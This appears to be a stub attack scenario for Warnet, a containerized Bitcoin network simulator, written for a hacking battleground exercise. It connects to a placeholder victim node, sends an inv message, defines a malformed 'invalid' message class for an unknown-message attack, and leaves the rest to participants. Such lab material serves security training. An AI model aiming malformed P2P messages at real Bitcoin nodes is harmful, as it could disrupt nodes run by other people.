#!/usr/bin/env python3

import socket

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import MSG_TX, CInv, hash256, msg_inv
from test_framework.p2p import P2PInterface

class msg_inv2:
    __slots__ = ("inv",)
    msgtype = b"invalid"

    def __init__(self, inv=None):
        self.inv = inv

    def serialize(self):
        return b"randominvalid"


# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class UnknownMessage(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate unknown message attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/stub_unknown_p2p.py"

    # Scenario entrypoint
    def run_test(self):
        # Get context from any node
        node = self.nodes[0]

        # We pick a node on the network to attack
        # We know this one is vulnderable to an unknown messages based on it's subver
        # Use either reconnaisance or ForkObserver UI to find vulnerable nodes
        # Change this to your teams colour if running in the battleground
        victim = "TARGET_TANK_NAME.default.svc"

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=node.p2pport, net=node.chain, timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        msg = msg_inv([CInv(MSG_TX, 0x12345)])
        attacker.send_and_ping(msg)
        self.log.info("Sent inv message")

        self.log.info("Sending inv2 message")
        # OVER TO YOU HACKERS


def main():
    UnknownMessage().main()


if __name__ == "__main__":
    main()
